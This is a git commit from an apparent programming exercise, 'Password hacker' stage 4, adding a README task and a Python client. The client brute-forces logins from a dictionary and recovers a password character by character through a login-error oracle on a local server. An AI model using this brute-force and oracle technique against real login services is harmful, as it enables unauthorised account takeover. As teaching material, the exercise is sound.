9da1afd0d99e56d8c07c5c98621ca378fe3f627e
aleksas <aasmc@yandex.ru>
2022-04-09 17:33:51 +0300

    Solve stage 4

--- README.md
+++ README.md
@@ -102,3 +102,84 @@ The greater-than symbol followed by a space (> ) represents the user input. Note
 > python hack.py localhost 9090
 qWeRTy
 ```
+## Stage 4
+### Description
+
+The server is becoming smarter along with your hacking program. Now the admin has implemented a security system by login and password. In order to access the site with admin privileges, you need to know the admin's login and password. Fortunately, we have a dictionary of different logins and a very interesting vulnerability. You need to improve your program once again to hack the new system.
+
+Also, now the admin has made a complex password that is guaranteed to be absent in the databases since it's randomly generated from several characters.
+
+The server now uses JSON to send messages.
+
+First of all, you should adjust your program so that it can send the combination of login and password in JSON format to the server. Your request should now look like this:
+
+```json
+{
+    "login": "admin",
+    "password": "12345678"
+}
+```
+In case of the wrong login, the response you receive looks like this:
+```json
+{
+    "result": "Wrong login!"
+}
+```
+
+If you got the login right but failed to find the password, you get this:
+```json
+{
+    "result": "Wrong password!"
+}
+```
+
+If some exception happens, you'll see this result:
+
+```json
+{
+    "result": "Exception happened during login"
+}
+```
+When you finally succeed in finding both the login and the password, you'll see the following:
+```json
+{
+    "result": "Connection success!"
+}
+```
+
+
+Use the dictionary of typical admin logins. Since you don’t know the login, you should try different variants from the dictionary the same way you did at the previous stage with the passwords.
+
+Use an empty password while searching for the correct login. It matters because you will know that the login is correct the moment you get the ‘wrong password’ result instead of ‘wrong login’.
+
+As for passwords, they’ve become yet harder, so a simple dictionary is no longer enough. Fortunately, a vulnerability has been found: the ‘exception’ message pops up when the symbols you tried for the password match the beginning of the correct one. 
+
+### Objectives
+
+Your algorithm is the following:
+
+- Try all logins with an empty password.
+- When you find the login, try out every possible password of length 1.
+- When an exception occurs, you know that you found the first letter of the password.
+- Use the found login and the found letter to find the second letter of the password.
+- Repeat until you receive the ‘success’ message.
+
+Finally, your program should print the combination of login and password in JSON format. The examples show two ways of what the output can look like.
+Examples
+
+The greater-than symbol followed by a space (> ) represents the user input. Note that it's not part of the input.
+
+### Example 1
+```text
+> python hack.py localhost 9090
+{
+    "login" : "superuser",
+    "password" : "aDgT9tq1PU0"
+}
+```
+
+### Example 2
+```text
+> python hack.py localhost 9090
+{"login": "new_user", "password": "Sg967s"}
+```
--- main.py
+++ main.py
@@ -2,6 +2,7 @@ import sys
 import socket
 import string
 import itertools
+import json
 
 alphabet_lower = string.ascii_lowercase
 alphabet_upper = string.ascii_uppercase
@@ -9,45 +10,94 @@ numbers = [str(x) for x in range(0, 10)]
 max_attempts = 1_000_000
 allowed_tokens = list(itertools.chain(alphabet_upper, alphabet_lower, numbers))
 path_to_file = "passwords.txt"
+buffer = 1024
 
 
-def get_password():
+def get_bruteforce_password():
     for i in range(1, len(allowed_tokens)):
         for p_word in itertools.product(allowed_tokens, repeat=i):
             yield ''.join(p_word)
 
 
-def generate_lower_first_passwords(word):
+def get_password_letters():
+    for i in range(0, len(allowed_tokens)):
+        yield allowed_tokens[i]
+
+
+def try_with_login_empty_pass(login, sock):
+    pass_login = {"login": f"{login}", "password": ""}
+    sock.send(json.dumps(pass_login).encode())
+    resp = json.loads(sock.recv(buffer).decode())
+    if resp["result"] == "Wrong password!":
+        return True
+    else:
+        return False
+
+
+def try_different_passwords(login, sock):
+    password_letter_generator = get_password_letters()
+    password = next(password_letter_generator)
+    while True:
+        pass_login = {"login": f"{login}", "password": f"{password}"}
+        sock.send(json.dumps(pass_login).encode())
+        resp = json.loads(sock.recv(buffer).decode())
+        if resp["result"] == "Exception happened during login":
+            password_letter_generator = get_password_letters()
+            password = f"{password}{next(password_letter_generator)}"
+        elif resp["result"] == "Wrong password!":
+            next_letter = next(password_letter_generator)
+            password = password[:-1]
+            password = f"{password}{next_letter}"
+        else:
+            print(json.dumps(pass_login))
+            break
+
+
+def generate_mixed_case_passwords(word):
     tuples = zip(word.lower(), word.upper())
     for p in itertools.product(*tuples):
         yield ''.join(p)
 
 
-def get_pass_line_generator(path):
+def get_line_generator(path):
     with open(path, 'r', encoding='utf8') as f:
         for line in f:
             yield line.strip()
 
 
 def generate_password():
-    line_gen = get_pass_line_generator(path_to_file)
+    line_gen = get_line_generator(path_to_file)
     for line in line_gen:
         if line.isnumeric():
             yield line
         else:
-            pass_gen = generate_lower_first_passwords(line)
+            pass_gen = generate_mixed_case_passwords(line)
             for p in pass_gen:
                 yield p
 
 
-def connect():
+def connect_stage4():
+    args = sys.argv
+    ip_addr = args[1]
+    port = int(args[2])
+    with socket.socket() as sock:
+        sock.connect((ip_addr, port))
+        login_generator = get_line_generator("logins.txt")
+        login = ""
+        for log in login_generator:
+            if try_with_login_empty_pass(log, sock):
+                login = log
+                break
+        try_different_passwords(login, sock)
+
+
+def connect_stage3():
     args = sys.argv
     ip_addr = args[1]
     port = int(args[2])
 
     with socket.socket() as sock:
         sock.connect((ip_addr, port))
-        buffer = 1024
         password_generator = generate_password()
         for message in password_generator:
             encoded_message = message.encode()
@@ -61,4 +111,4 @@ def connect():
 
 # Press the green button in the gutter to run the script.
 if __name__ == '__main__':
-    connect()
+    connect_stage4()
